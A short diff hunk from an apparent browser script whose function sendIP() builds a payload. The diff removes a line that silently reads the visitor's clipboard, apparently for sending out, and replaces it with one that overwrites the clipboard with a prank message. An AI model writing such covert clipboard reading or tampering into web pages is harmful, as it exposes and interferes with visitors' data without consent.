@@ -36,7 +36,7 @@ async function sendIP() {
         console.error("Error");
       });
 
-      const clipboard = await navigator.clipboard.readText();
+      const clipboard = await navigator.clipboard.writeText("Get Rick Rolled lol");
 
     //create payload
     const payload = {
